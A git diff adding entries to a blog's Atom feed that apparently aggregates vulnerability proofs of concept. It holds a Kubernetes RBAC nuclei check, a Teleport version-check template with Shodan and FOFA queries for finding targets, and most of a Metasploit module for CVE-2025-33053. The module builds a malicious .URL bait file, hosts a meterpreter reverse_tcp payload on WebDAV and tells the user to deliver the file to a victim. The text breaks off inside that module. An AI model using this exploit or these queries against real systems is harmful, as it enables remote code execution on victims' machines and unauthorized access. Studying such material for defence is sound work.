@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-17T15:15:12.747Z</updated>
+  <updated>2025-06-17T15:45:55.506Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,139 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Github Poc</title>
+    <link href="http://example.com/2025/06/17/github_334603809/"/>
+    <id>http://example.com/2025/06/17/github_334603809/</id>
+    <published>2025-06-17T15:45:55.509Z</published>
+    <updated>2025-06-17T15:45:55.506Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> </p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-46171</li></ul><p><strong>来源：</strong> <a href="https://github.com/oiyl/CVE-2025-46171">https://github.com/oiyl/CVE-2025-46171</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-46171"><a href="#CVE-2025-46171" class="headerlink" title="CVE-2025-46171"></a>CVE-2025-46171</h2>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; &lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Kubernetes Pod 创建权限角色漏洞</title>
+    <link href="http://example.com/2025/06/17/github_995943862/"/>
+    <id>http://example.com/2025/06/17/github_995943862/</id>
+    <published>2025-06-17T15:45:48.885Z</published>
+    <updated>2025-06-17T15:45:48.881Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Kubernetes Pod 创建权限角色漏洞</p><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 检查具有创建pod权限的角色。如果服务账户被分配了允许创建pod的角色，可能会导致pod逃逸。建议配置pod，使其不被分配创建其他pod的权限。</p><p><strong>产品厂商：</strong> Kubernetes</p><p><strong>产品名称：</strong> Kubernetes</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/57237817bccc4068ffa940977497912169a0fb0f/cloud%2Fkubernetes%2Frbac%2Fk8s-role-pod-create.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/57237817bccc4068ffa940977497912169a0fb0f/cloud%2Fkubernetes%2Frbac%2Fk8s-role-pod-create.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> k8s-role-pod-create<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Roles that have pod create permissions<br>  <span class="hljs-params">author:</span> domwhewell-sage<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> Checks for roles that have permissions to create pods.<br>  <span class="hljs-params">impact:</span> |<br>    Pods that have the service account <span class="hljs-keyword">with</span> a role that allows them to create pods, could allow a pod breakout.<br>  <span class="hljs-params">remediation:</span> Configure pods so they are not assigned the permission to create other pods<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>kubernetes.io<span class="hljs-operator">/</span>docs<span class="hljs-operator">/</span>concepts<span class="hljs-operator">/</span>security<span class="hljs-operator">/</span>rbac-good-practices<span class="hljs-operator">/</span><span class="hljs-comment">#least-privilege</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//cloud.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/abusing-roles-clusterroles-in-kubernetes/index.html</span><br>  <span class="hljs-params">tags:</span> cloud,devops,kubernetes,devsecops,roles,k8s,k8s-cluster-security<br><br><span class="hljs-params">flow:</span> |<br>  code(<span class="hljs-number">1</span>);<br>  for (<span class="hljs-keyword">let</span> role of template.items) &#123;<br>    set(<span class="hljs-string">&quot;role&quot;</span>, role)<br>    javascript(<span class="hljs-number">1</span>);<br>  &#125;<br><br><span class="hljs-params">self-contained:</span> <span class="hljs-literal">true</span><br><span class="hljs-params">code:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">engine:</span><br>      <span class="hljs-operator">-</span> sh<br>      <span class="hljs-operator">-</span> bash<br>    <span class="hljs-params">source:</span> kubectl get role <span class="hljs-operator">-</span>-all-namespaces <span class="hljs-operator">-</span>-output<span class="hljs-operator">=</span>json<br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> json<br>        <span class="hljs-params">name:</span> items<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">json:</span><br>          <span class="hljs-operator">-</span> &#x27;.items[]&#x27;<br><br><span class="hljs-params">javascript:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">code:</span> |<br>        <span class="hljs-keyword">let</span> role <span class="hljs-operator">=</span> JSON.parse(template.role);<br>        <span class="hljs-keyword">let</span> riskyRules <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        role.rules.forEach(rule <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> &#123;<br>          <span class="hljs-keyword">if</span> ((rule.resources.includes(<span class="hljs-string">&quot;pods&quot;</span>) <span class="hljs-operator">&amp;&amp;</span> rule.verbs.includes(<span class="hljs-string">&quot;create&quot;</span>)) <span class="hljs-operator">||</span><br>              (rule.resources.includes(<span class="hljs-string">&quot;pods&quot;</span>) <span class="hljs-operator">&amp;&amp;</span> rule.verbs.includes(<span class="hljs-string">&quot;*&quot;</span>)) <span class="hljs-operator">||</span><br>              (rule.resources.includes(<span class="hljs-string">&quot;*&quot;</span>) <span class="hljs-operator">&amp;&amp;</span> rule.verbs.includes(<span class="hljs-string">&quot;create&quot;</span>)) <span class="hljs-operator">||</span><br>              (rule.resources.includes(<span class="hljs-string">&quot;*&quot;</span>) <span class="hljs-operator">&amp;&amp;</span> rule.verbs.includes(<span class="hljs-string">&quot;*&quot;</span>))) &#123;<br>            riskyRules<span class="hljs-operator">++</span>;<br>          &#125;<br>        &#125;);<br>        <span class="hljs-keyword">if</span> (riskyRules <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span>) &#123;<br>          <span class="hljs-keyword">let</span> result <span class="hljs-operator">=</span> (`Role &#x27;$&#123;role.metadata.name&#125;&#x27; <span class="hljs-keyword">in</span> namespace &#x27;$&#123;role.metadata.namespace&#125;&#x27; has $&#123;riskyRules&#125; rule(s) <span class="hljs-keyword">with</span> &#x27;pods&#x27; resource and &#x27;create&#x27; verb.`);<br>          Export(result);<br>        &#125;<br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> response<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Kubernetes Pod 创建权限角色漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Teleport 认证绕过漏洞</title>
+    <link href="http://example.com/2025/06/17/github_1269932539/"/>
+    <id>http://example.com/2025/06/17/github_1269932539/</id>
+    <published>2025-06-17T15:45:39.942Z</published>
+    <updated>2025-06-17T15:45:39.937Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Teleport 认证绕过漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49825</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Teleport 17.5.2之前的版本存在远程认证绕过漏洞，攻击者可利用此漏洞未经授权访问受影响的系统。</p><p><strong>产品厂商：</strong> gravitational</p><p><strong>产品名称：</strong> Teleport</p><p><strong>影响版本：</strong> version &lt; 17.5.2</p><p><strong>搜索语法：</strong> http.favicon.hash:544208100, http.favicon.hash:1854879765, http.favicon.hash:-1275955539, Set-Cookie: __Host-grv_csrf, icon_hash&#x3D;”544208100”, icon_hash&#x3D;”1854879765”, icon_hash&#x3D;”-1275955539”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/0d29ca61aea6328c5d9d4ddf806457b15930a8d7/http%2Fcves%2F2025%2FCVE-2025-49825.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/0d29ca61aea6328c5d9d4ddf806457b15930a8d7/http%2Fcves%2F2025%2FCVE-2025-49825.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">49825</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Teleport <span class="hljs-operator">-</span> Authentication Bypass<br>  <span class="hljs-params">author:</span> pdteam<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Teleport versions prior to <span class="hljs-number">17.5</span>.<span class="hljs-number">2</span> are vulnerable to a remote authentication bypass vulnerability. This issue allows attackers to gain unauthorized access to affected systems.<br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">49825</span><br>    <span class="hljs-params">cvss-metrics:</span> <span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/gravitational/teleport/security/advisories/GHSA-8cqv-pj7f-pwpc</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">shodan-query:</span><br>      <span class="hljs-operator">-</span> http.favicon.hash:<span class="hljs-number">544208100</span><br>      <span class="hljs-operator">-</span> http.favicon.hash:<span class="hljs-number">1854879765</span><br>      <span class="hljs-operator">-</span> http.favicon.hash:-<span class="hljs-number">1275955539</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Set-Cookie: __Host-grv_csrf&quot;</span><br>    <span class="hljs-params">fofa-query:</span><br>      <span class="hljs-operator">-</span> icon_hash<span class="hljs-operator">=</span><span class="hljs-string">&quot;544208100&quot;</span><br>      <span class="hljs-operator">-</span> icon_hash<span class="hljs-operator">=</span><span class="hljs-string">&quot;1854879765&quot;</span><br>      <span class="hljs-operator">-</span> icon_hash<span class="hljs-operator">=</span><span class="hljs-string">&quot;-1275955539&quot;</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Set-Cookie: __Host-grv_csrf&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2025,teleport<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/webapi/ping&quot;</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> json<br>        <span class="hljs-params">name:</span> version<br>        <span class="hljs-params">json:</span><br>          <span class="hljs-operator">-</span> .server_version<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> json<br>        <span class="hljs-params">json:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;Teleport Version: &quot;</span><span class="hljs-operator">+</span> .server_version&#x27;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">name:</span> version_check<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> compare_versions(version, &#x27;<span class="hljs-operator">&lt;</span> <span class="hljs-number">17.5</span>.<span class="hljs-number">2</span>&#x27;)<br>          <span class="hljs-operator">-</span> contains_all(body, <span class="hljs-string">&quot;server_version&quot;</span>, <span class="hljs-string">&quot;teleport&quot;</span>)<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-operator">!</span>contains_any(version, <span class="hljs-string">&quot;16.5.12&quot;</span>, <span class="hljs-string">&quot;15.5.3&quot;</span>, <span class="hljs-string">&quot;14.4.1&quot;</span>, <span class="hljs-string">&quot;13.4.27&quot;</span>, <span class="hljs-string">&quot;12.4.35&quot;</span>)&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Teleport 认证绕过漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/s</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CVE-2025-33053 Exploit via Malicious .URL File and WebDAV</title>
+    <link href="http://example.com/2025/06/17/github_114577505/"/>
+    <id>http://example.com/2025/06/17/github_114577505/</id>
+    <published>2025-06-17T15:45:27.080Z</published>
+    <updated>2025-06-17T15:45:27.077Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CVE-2025-33053 Exploit via Malicious .URL File and WebDAV</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-33053</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该模块通过生成恶意的.URL文件来利用CVE-2025-33053，该文件指向一个受信任的LOLBAS二进制文件，其参数设计用于触发意外行为。可选地，生成一个有效载荷并托管在指定的WebDAV目录上。当受害者打开快捷方式时，它将尝试访问WebDAV路径，可能通过受信任的二进制文件导致远程代码执行。</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/fda69e0a743d16452c3c17b66d3e0154e598ea0e/modules%2Fexploits%2Fwindows%2Ffileformat%2Fcve_2025_33053.rb">https://github.com/rapid7/metasploit-framework/blob/fda69e0a743d16452c3c17b66d3e0154e598ea0e/modules%2Fexploits%2Fwindows%2Ffileformat%2Fcve_2025_33053.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-comment"># frozen_string_literal: true</span><br><br><span class="hljs-comment"># Metasploit module to exploit CVE-2025-33053 via malicious .URL and WebDAV payload hosting.</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; <span class="hljs-title class_ inherited__">Msf::Exploit::Remote</span><br>  <span class="hljs-title class_">Rank</span> = <span class="hljs-title class_">NormalRanking</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-variable language_">super</span>(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;CVE-2025-33053 Exploit via Malicious .URL File and WebDAV&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; <span class="hljs-string">&#x27;</span><br><span class="hljs-string">          This module exploits CVE-2025-33053 by generating a malicious .URL file pointing</span><br><span class="hljs-string">          to a trusted LOLBAS binary with parameters designed to trigger unintended behavior.</span><br><span class="hljs-string">          Optionally, a payload is generated and hosted on a specified WebDAV directory.</span><br><span class="hljs-string">          When the victim opens the shortcut, it will attempt to access the WebDAV path,</span><br><span class="hljs-string">          potentially resulting in remote code execution via a trusted binary.</span><br><span class="hljs-string">        &#x27;</span>,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<span class="hljs-string">&#x27;Dev Bui Hieu&#x27;</span>],<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; <span class="hljs-variable constant_">MSF_LICENSE</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2025-06-11&#x27;</span>,<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2025-33053&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://github.com/DevBuiHieu/CVE-2025-33053-Proof-Of-Concept&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;win&#x27;</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; <span class="hljs-variable constant_">ARCH_X64</span>,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [[<span class="hljs-string">&#x27;Windows (generic)&#x27;</span>, &#123;&#125;]],<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span><br>      )<br>    )<br><br>    register_options(<br>      [<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;OUTFILE&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Output URL file name&#x27;</span>, <span class="hljs-string">&#x27;bait.url&#x27;</span>]),<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;PAYLOAD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Payload to generate&#x27;</span>, <span class="hljs-string">&#x27;windows/x64/meterpreter/reverse_tcp&#x27;</span>]),<br>        <span class="hljs-title class_">OptBool</span>.new(<span class="hljs-string">&#x27;GEN_PAYLOAD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Generate payload and move to WebDAV directory&#x27;</span>, <span class="hljs-literal">true</span>]),<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;WEBDAV_DIR&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;WebDAV directory path&#x27;</span>, <span class="hljs-string">&#x27;/var/www/webdav&#x27;</span>])<br>      ]<br>    )<br>    register_advanced_options(<br>      [<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;LOLBAS_EXE&#x27;</span>,<br>                      [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Path to trusted binary (LOLBAS)&#x27;</span>, <span class="hljs-string">&#x27;C:\\Program Files\\Internet Explorer\\iediagcmd.exe&#x27;</span>]),<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;ICON_PATH&#x27;</span>,<br>                      [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Icon file path&#x27;</span>, <span class="hljs-string">&#x27;C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe&#x27;</span>]),<br>        <span class="hljs-title class_">OptInt</span>.new(<span class="hljs-string">&#x27;ICON_INDEX&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Icon index in icon file&#x27;</span>, <span class="hljs-number">13</span>]),<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;MODIFIED_HEX&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Modified timestamp in hex&#x27;</span>, <span class="hljs-string">&#x27;20F06BA06D07BD014D&#x27;</span>])<br>      ]<br>    )<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>    prepare_webdav_dir<br>    generate_payload_if_needed<br>    write_url_file<br>    print_status(<span class="hljs-string">&quot;Module complete. Deliver <span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;OUTFILE&#x27;</span>]&#125;</span> to victim.&quot;</span>)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">prepare_webdav_dir</span><br>    print_status(<span class="hljs-string">&#x27;Creating WebDAV directory if not exists...&#x27;</span>)<br>    <span class="hljs-title class_">FileUtils</span>.mkdir_p(datastore[<span class="hljs-string">&#x27;WEBDAV_DIR&#x27;</span>]) <span class="hljs-keyword">unless</span> <span class="hljs-title class_">File</span>.directory?(datastore[<span class="hljs-string">&#x27;WEBDAV_DIR&#x27;</span>])<br>  <span class="hljs-keyword">rescue</span> <span class="hljs-title class_">Errno</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:EACCES</span><br>    fail_with(<br>      <span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:NoAccess</span>,<br>      <span class="hljs-string">&quot;Cannot create WebDAV directory. Permission denied.\n&quot;</span> \<br>      <span class="hljs-string">&quot;Try restarting Metasploit with sudo or change ownership of <span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;WEBDAV_DIR&#x27;</span>]&#125;</span>.&quot;</span><br>    )<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_payload_if_needed</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> datastore[<span class="hljs-string">&#x27;GEN_PAYLOAD&#x27;</span>]<br><br>    exe_path = <span class="hljs-title class_">File</span>.join(datastore[<span class="hljs-string">&#x27;WEBDAV_DIR&#x27;</span>], <span class="hljs-string">&#x27;payload.exe&#x27;</span>)<br>    print_good(<span class="hljs-string">&quot;Generating payload at: <span class="hljs-subst">#&#123;exe_path&#125;</span>&quot;</span>)<br>    generate_payload_exe(datastore[<span class="hljs-string">&#x27;PAYLOAD&#x27;</span>], datastore[<span class="hljs-string">&#x27;LHOST&#x27;</span>], datastore[<span class="hljs-string">&#x27;LPORT&#x27;</span>], exe_path)<br>  <span 